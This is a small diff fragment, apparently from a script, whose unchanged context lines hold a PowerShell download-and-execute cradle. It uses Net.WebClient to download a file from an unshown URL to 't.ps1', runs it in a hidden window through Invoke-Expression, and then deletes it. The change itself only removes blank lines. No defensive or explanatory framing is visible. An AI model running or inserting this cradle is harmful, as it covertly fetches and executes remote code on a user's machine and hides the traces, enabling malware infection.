@@ -131,7 +131,4 @@ WinPrintLine $d=New-Object Net.WebClient;
 WinPrintLine $f='t.ps1';$d.DownloadFile($u,$f);
 WinPrintLine powershell -w h -c "gc $f -Raw|iex";rm $f -ea 0;
 
-
-
-
 ```
